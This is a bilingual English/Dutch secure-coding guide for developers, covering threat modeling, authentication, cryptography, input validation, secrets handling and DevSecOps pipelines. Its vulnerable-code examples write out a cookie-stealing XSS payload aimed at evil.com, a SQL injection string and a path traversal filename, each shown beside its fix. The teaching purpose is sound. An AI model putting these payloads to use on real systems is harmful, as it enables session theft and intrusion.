01 · The Foundation

The Security MindsetDe Security Mindset

The single most important shift is not learning a new tool — it is learning to think about your own code from an adversarial perspective. A regular developer asks "does this work correctly?" A secure developer also asks "how could this be abused?" This question — asked habitually, at design time — prevents more vulnerabilities than any scanner or review.

De belangrijkste verschuiving is niet het leren van een nieuwe tool — het is leren nadenken over je eigen code vanuit een vijandig perspectief. Een gewone ontwikkelaar vraagt "werkt dit correct?" Een veilige ontwikkelaar vraagt ook "hoe kan dit misbruikt worden?" Deze vraag — routinematig gesteld tijdens het ontwerp — voorkomt meer kwetsbaarheden dan welke scanner of review dan ook.

Think Like an AttackerDenk als een Aanvaller
Adversarial mindset · Abuse cases · STRIDEVijandige mindset · Abuse cases · STRIDE

For every feature, interface, and data flow you build, ask: "How could this be misused?" Attackers don't follow the happy path — they explore edge cases, try unexpected inputs, and probe every boundary. You don't need to be a professional penetration tester; you need to habitually ask this question before writing code, not after.

Voor elke functie, interface en datastroom die je bouwt, vraag je: "Hoe kan dit misbruikt worden?" Aanvallers volgen niet het gelukkige pad — ze verkennen randgevallen, proberen onverwachte input en tasten elke grens af. Je hoeft geen professionele pentester te zijn; je moet deze vraag gewoontegetrouw stellen voordat je code schrijft, niet erna.

Abuse Case Examples
Feature: "Upload a profile photo"
Functional thinking:
  → does it accept JPG/PNG? ✓
  → does the preview look right? ✓

Security (adversarial) thinking:
  → what if I upload a .php file?
  → what if the image is 4 GB?
  → what if EXIF data contains a script?
  → what if filename is "../../../etc/passwd"?
  → what if I upload 10,000 files in parallel?

Each question → a security requirement
How to develop this habit
For every input: what's the worst-case payload?
For every access: what if a low-priv user requests this?
Study real CVEs — ask "could my code have this bug?"
Use STRIDE as a mental checklist on every feature

Challenge Your Assumptions
Trust boundaries · Explicit assumptions · Assume breach

Every system is built on assumptions. Secure developers make those assumptions explicit — then challenge them. Attackers succeed by exploiting assumptions that turned out to be false. "We assumed authenticated users are trustworthy." "We assumed the internal network is safe." Violated assumptions are the anatomy of most breaches.

Dangerous Hidden Assumptions
✗ "Authenticated users have good intent"
✗ "The corporate network is trusted"
✗ "Our open-source dependencies are clean"
✗ "Our cloud provider handles our security"
✗ "Nobody will find that hidden admin endpoint"
✗ "Our own admins won't be compromised"
✗ "The user's browser sends the right data"

Assume breach: design as if attackers
are already inside — because they may be.
The Two Questions
Is this assumption still valid given today's threat landscape?
What happens to my system if this assumption is violated?
Document assumptions explicitly — they become your threat model
🛡️
You Own the Security of Your Code
Developer ownership · Shift Left · Shared responsibility

Security is not a gate at the end of the pipeline — it is not the security team's job alone, and it cannot be "added later." Every developer owns the security of the code they write. "Shift left" means catching security issues in your IDE, your design discussions, and your PR reviews — not six months later in a penetration test.

1
Review your own PR for security before submitting it
2
Raise security questions in requirements and design meetings
3
Don't wait for the security team to find problems in your code
4
Say "I don't know how to do this securely" — that is the right question
5
Make security concerns visible in sprint planning — they deserve time
6
Treat a security bug like any other bug: fix it, understand why it happened, prevent recurrence

Never Roll Your Own Security
Kerckhoffs' principle · Use vetted primitives

Cryptography, authentication, and access control are extremely hard to get right. Don't implement your own — ever. The temptation to "just write a simple check" or "roll a quick hashing function" is how breaches happen. Use established, audited libraries and well-understood protocols.

✗
Never: MD5/SHA1 for passwords, homebrew session tokens, custom ciphers
✓
Passwords: Argon2id, bcrypt — via a library, not written from scratch
✓
Tokens: OS CSPRNG — secrets.token_bytes(), crypto.randomBytes()
✓
Auth: OAuth 2.0 + OIDC — don't write handcrafted token systems
✓
Queries: Parameterized / prepared statements — not string concatenation
✓
Crypto: libsodium, OpenSSL — not your own implementation
Principle

Threat Modeling
STRIDE · PASTA · Data Flow Diagrams
Level 2 — Core Skill

Threat modeling is a structured way to think about what can go wrong before you write a single line of code. Draw a Data Flow Diagram, identify trust boundaries, apply STRIDE. The Microsoft SDL mandates it; NIST SSDF mandates it; Google, Amazon, and Netflix all practice it. It is the single highest-leverage security activity per hour invested.

STRIDE — one question per threat category
Spoofing        → Is the caller really who they claim?
Tampering       → Can data be altered in transit or at rest?
Repudiation     → Can actors deny their actions? (audit trail)
Info Disclosure → Can data leak to unauthorized parties?
Denial of Service → Can the system be made unavailable?
Elevation of Privilege → Can a user gain more than intended?

Apply to every element in your Data Flow Diagram:
processes, data stores, data flows, trust boundaries
4-Question Threat Model (start here)
What are we building? — draw the DFD, mark trust boundaries
What can go wrong? — apply STRIDE to each element
What do we do about it? — map mitigations; add to backlog
Did we do a good job? — review; revisit when the design changes

Authentication & Authorization
Identity, sessions, OAuth 2.0, RBAC, IDOR
Level 2 — Core Skill

These are the source of OWASP's #1 vulnerability class — Broken Access Control. You must understand how sessions work, what JWTs do and don't guarantee, how OAuth 2.0 flows work, why server-side checks are mandatory, and how object-level authorization (IDOR prevention) works.

🔑
Passwords: Argon2id (cost: 64MB memory, 3 iterations) — never MD5/SHA1
🍪
Sessions: server-side store; HttpOnly + Secure + SameSite=Lax cookies
🏷️
JWTs: validate signature + expiry + audience — never trust payload without verification
🏛️
OAuth 2.0: authorization code + PKCE flow; never implicit flow (deprecated)
📱
MFA: WebAuthn/passkeys first; TOTP second; avoid SMS where possible
🚧
IDOR: check that THIS user can access THIS object — not just "is this user authenticated"
🔒
Authz: server-side ALWAYS — hiding a button in the UI is not access control

Applied Cryptography
Choosing and using — not implementing
Level 2 — Core Skill

You don't need to understand elliptic curve math — but you must know which algorithm to use for each job and which to avoid. The wrong choice (MD5 for passwords, ECB mode, hardcoded key, Math.random() for tokens) is a critical vulnerability even when the implementation itself has zero bugs.

H
Hash data: SHA-256 / SHA-3 — never MD5 / SHA-1
P
Hash passwords: Argon2id — never bcrypt cost=4, never MD5
E
Symmetric encrypt: AES-256-GCM or ChaCha20-Poly1305 — never ECB mode
T
Transport: TLS 1.3 — disable TLS 1.0/1.1/SSLv3
R
Random: secrets.token_bytes(), crypto.randomBytes() — never Math.random()
K
Key storage: KMS / Vault / HSM — never hardcoded in source

Input Validation & Output Encoding
Root cause of all injection attacks
Must Have · Day 1

All injection attacks (SQL, XSS, command injection, path traversal, template injection) share one root cause: user-controlled data is treated as trusted instructions. The fix is always structural: separate data from code using the language's native mechanism.

✗ Vulnerable
# SQL Injection
query = "SELECT * FROM users WHERE id='" + uid + "'"
# → attacker sends: ' OR '1'='1

# XSS — unsanitized output
res.write("<h1>Hello " + username + "</h1>")
# → attacker stored: <script>document.location='evil.com/steal?c='+document.cookie</script>

# Path Traversal
open("/files/" + user_filename)
# → attacker sends: ../../etc/passwd
✓ Secure
# SQL — parameterized query
cursor.execute("SELECT * FROM users WHERE id=?", [uid])

# XSS — context-aware output encoding
res.write("<h1>Hello " + html.escape(username) + "</h1>")

# Path traversal — resolve + verify stays in root
p = Path("/files", user_filename).resolve()
assert str(p).startswith("/files"), "Path traversal!"
5-Stage Validation Process
Identify all input sources: URL, form, headers, cookies, files, env, DB, APIs
Canonicalize first — URL-decode, strip BOM, normalize Unicode NFC
Allowlist validate — regex, type, range, length (not blocklist)
Encode output for context — HTML, JS, CSS, URL, SQL all differ
Reject clearly on failure — never silently fix invalid input

Authentication & Session Implementation
Secure auth in practice — not just theory
Core Skill

Many breaches come from correct libraries used incorrectly — wrong cookie flags, missing token expiry, hardcoded secrets, or skipped rate limiting. Authentication implementation requires knowing not just what to use but precisely how to configure it.

Session Cookie — all flags requiredHTTP
Set-Cookie: session=abc123;
  HttpOnly;      ← JS cannot read (XSS protection)
  Secure;        ← only sent over HTTPS
  SameSite=Lax; ← CSRF protection
  Path=/;
  Max-Age=3600  ← expire in 1 hour
Authentication Implementation Checklist
Hash passwords with Argon2id (memory: 64MB, iterations: 3, parallelism: 1)
Rate-limit login: max 5 attempts / 15 min per IP + username combination
Return generic errors — never distinguish "user not found" vs "wrong password"
Invalidate session on logout AND on password change
Step-up auth — re-authenticate before sensitive operations (delete account, change email)
Rotate tokens periodically and on privilege change

Secure API Design & Implementation
OWASP API Security Top 10
Core Skill

APIs are the primary attack surface of modern applications. Every endpoint must be designed with security in mind: authentication, authorization, rate limiting, input validation, and response shielding. The OWASP API Security Top 10 covers the most common API-specific failures.

1
Authenticate every request — no unauthenticated endpoints unless intentionally public
2
Authorize every operation — check THIS user can access THIS resource (IDOR prevention)
3
Rate limit all endpoints — especially auth, OTP, password reset, expensive operations
4
Validate input schema — use OpenAPI validation middleware; reject unknown fields
5
Limit response data — return only fields the caller needs and is authorized to see
6
HTTPS everywhere — HSTS header; reject plaintext HTTP
7
Security headers — CSP, CORS policy, X-Frame-Options, X-Content-Type-Options
8
No sensitive data in URLs — tokens, keys, passwords must not appear in query strings or paths

Secrets Management
No secrets in source code — ever
Must Have · Day 1

One of the most common and most preventable breach vectors: API keys, passwords, and certificates committed to version control. Attackers continuously scan GitHub, GitLab, and npm for exposed secrets. Once committed, a secret is compromised — even if deleted from history (it lives in other clones, forks, and backups).

✗ Never — secrets in code
DB_PASSWORD = "supersecret123"    # hardcoded
API_KEY     = "sk-proj-abc..."    # in config file
aws_secret  = "AKIAIOSFODNN7..." # in .env committed to git
✓ Correct — runtime injection from secure store
import os
db_pass = os.getenv("DB_PASSWORD")  # from Vault/KMS

# .gitignore must include .env before first commit
# Use pre-commit hook: gitleaks detect

# Short-lived credentials (AWS)
sts.assume_role(RoleArn=..., DurationSeconds=900)
Secrets Management Strategy
Add .env to .gitignore before the first commit — not after
Install pre-commit hook: gitleaks detect on every developer machine
Use a secrets manager: Vault, AWS Secrets Manager, Azure Key Vault, Doppler
Prefer short-lived credentials (JIT access) over long-lived API keys
Rotate immediately on any suspected exposure — don't wait to confirm

Dependency & Supply Chain Security
SCA · SBOM · CVE management
Core Skill

The majority of modern application code is third-party. One vulnerable dependency can compromise an otherwise perfectly written application. Log4Shell, Heartbleed, XZ Utils — all were dependency attacks. Knowing what you include and whether it's safe is as important as securing your own code.

🔒
Lock versions: use package-lock.json / poetry.lock / go.sum — never loose version ranges in production
🔍
SCA scan in CI/CD: npm audit, pip-audit, trivy fs — on every build
🤖
Dependabot / Renovate: automated PRs for CVE fixes and updates
📋
Generate SBOM: syft or CycloneDX — know every component in your artifact
🧐
Evaluate before adding: maintenance status, known issues, download counts, license
🚨
CVE SLA: CRITICAL = fix in 24h; HIGH = 7 days; MEDIUM = next sprint

Secure Logging & Error Handling
What to log, what never to expose
Core Skill

Logs are your only forensic evidence after an incident — but they can also leak sensitive data to aggregators, developers, and attackers. Error messages must shield internal state. The goal: log enough to detect and investigate breaches, while never logging what you shouldn't.

✓
Log: auth events (success + failure + IP), access denied, privilege changes, data modifications, config changes, validation failures
✓
Include per event: timestamp, user ID, IP, action, resource, outcome, correlation ID
✗
Never log: passwords, session tokens, credit cards, API keys, SSNs, health data
✓
Error handling: return generic message to client + reference ID; log full detail internally
✓
Log protection: ship to separate write-only SIEM — attackers must not be able to delete them

04 · Security in Your SDLC

Security Across the Development Lifecycle

A secure developer doesn't just write secure code — they participate in security activities at every stage of the development lifecycle. This is what OWASP SAMM, NIST SSDF, and Microsoft SDL all describe: security embedded in requirements, design, implementation, testing, and operations. Security in process is what scales beyond individual heroics.

NIST SSDFOWASP SAMMMicrosoft SDLRequirementsDesignReviewTesting

🔄 Security Activities Mapped to the SDLC (based on NIST SSDF + Microsoft SDL)

1

Requirements & Planning

Elicit security requirements alongside functional ones. Ask: what data is sensitive? who needs access? what are the regulatory obligations? Define abuse cases alongside use cases. Specify security acceptance criteria before the feature is designed. Output: security requirements in the backlog with DoD.

2

Architecture & Design — Threat Modeling

Run a threat modeling session before significant features or architecture changes. Draw Data Flow Diagrams, identify trust boundaries, apply STRIDE to every element. 4 questions: What are we building → What can go wrong → What do we do about it → Did we do a good job? Output: threats + mitigations added to backlog.

3

Implementation — Secure Coding + Self-Review

Apply secure coding skills (panel 03) every day. Before submitting a PR, review your own code with a security lens: are there injection points? are all access checks in place? are secrets handled correctly? Run SAST locally. Use the security checklist below as a guide.

4

Code Review — Security-Focused Peer Review

When reviewing others' code, actively look for security issues — not just correctness and style. Make one focused pass per category: access control → injection → secrets → error handling. A reviewer who catches an injection bug saves weeks of remediation. Use the review checklist below.

5

CI/CD — Automated Security Gates

Run automated security tests in every pipeline: SAST (static code analysis), SCA (dependency CVEs), secrets scanning, and IaC scanning. Block on CRITICAL findings. DAST runs against staging before production. Every developer sees security findings immediately — not weeks later.

6

Deployment — Secure Configuration & IaC

Secure configuration is a developer responsibility. Review IaC (Terraform, Kubernetes manifests, Dockerfile) for security issues. Use secrets managers — never hardcode in deployment configs. Apply least privilege to service accounts and IAM roles. Enforce network policies.

7

Operations — Monitor, Respond, Patch

Know what your application logs and what it alerts on. Participate in on-call for security incidents. When a CVE is published for a dependency you use, act immediately based on your patch SLA. Conduct post-mortems on security bugs — understand the root cause and prevent recurrence.

Security Code Review — Focused Checklists
🔐
Access Control Review
OWASP A01 — the #1 missed category

The most common missed category in code review. For every new endpoint or data operation, ask these questions systematically.

?
Can this endpoint be reached without authentication?
?
Does the code verify this user can access this specific resource (not just "is logged in")?
?
Is the check on the server — or only in the UI/client?
?
Can a regular user reach admin functionality by changing a parameter?
?
Can user A access user B's data by manipulating an ID in the URL or request body?
💉
Injection Review
SQL, XSS, CMDi, Path Traversal, SSTI

Look for every place where user-controlled input flows into a structured output: database query, HTML, shell command, file path, template, LDAP, XML, log line.

?
Is user input concatenated into a SQL string rather than parameterized?
?
Is user input written into HTML without context-aware encoding?
?
Is user input passed to os.system(), exec(), eval(), subprocess with shell=True?
?
Is user input used to construct a file path without canonicalization + boundary check?
?
Is user input used as a template string (SSTI vulnerability)?
🔒
Secrets & Crypto Review
Keys, algorithms, random, storage

Scan every PR for these patterns. They are easy to spot once you know what to look for.

?
Are there hardcoded passwords, API keys, tokens, or connection strings?
?
Is MD5, SHA1, DES, or RC4 used anywhere?
?
Is random() / Math.random() / time()-seeding used for security-sensitive values?
?
Is AES used in ECB mode, or without an IV?
?
Are secrets loaded from environment variables or a secrets manager (not config files)?
📡
Error Handling & Logging Review
Information leakage, audit trail

Check that failures don't leak internal state and that security events are captured.

?
Are stack traces, SQL errors, or file paths returned to the client?
?
Do different auth failure messages reveal whether the user exists?
?
Are passwords, tokens, or card numbers being written to logs?
?
Are authentication and authorization failures being logged with sufficient context?
?
Is there a generic catch-all that returns True or grants access on error?
ℹ️
Review strategy: Don't try to find everything in one unfocused pass. Make one dedicated pass per concern: first access control, then injection, then secrets, then error handling. Focused attention per category catches more issues than a single scan. Use the checklists above as your guide — not as a replacement for reading the code carefully.

Secrets Detection
Pre-commit hooks + CI/CD scanning
Must Have · Day 1 Setup

Automatically detect secrets before they reach your repository. Install a pre-commit hook on every developer machine — this prevents secrets from ever entering git history. Also run in CI/CD as a second line of defense.

gitleaks pre-commit setupshell
# 1. Install pre-commit
pip install pre-commit

# 2. Create .pre-commit-config.yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks

# 3. Install the hook
pre-commit install
# Every git commit is now scanned automatically

DevSecOps Pipeline — Target Architecture
Security as code in every commit
Target State

The goal is security gates in every CI/CD pipeline run — not manual checks before quarterly releases. Developers get immediate feedback. Security findings become just another category of failing test. This is what NIST SSDF and OWASP SAMM describe as the target DevSecOps posture.

Target CI/CD Security Pipeline
git push
  ↓ [pre-commit]   gitleaks + lint
  ↓ [build]
  ↓ [SAST]        semgrep / codeql  → block CRITICAL
  ↓ [SCA]         trivy / dependabot → block CRITICAL CVE
  ↓ [IaC]         checkov            → block HIGH misconfig
  ↓ [secrets]     gitleaks in CI     → block always
  ↓ [DAST]        zap vs staging     → alert on HIGH
  ↓ [sign]        cosign sign image
  ↓ deploy to production

New frameworks introduce new vulnerability classes. The final step is building sustainable habits, contributing to your team's security culture, and staying current over time.

Becoming a Security Champion

What a Security Champion Does
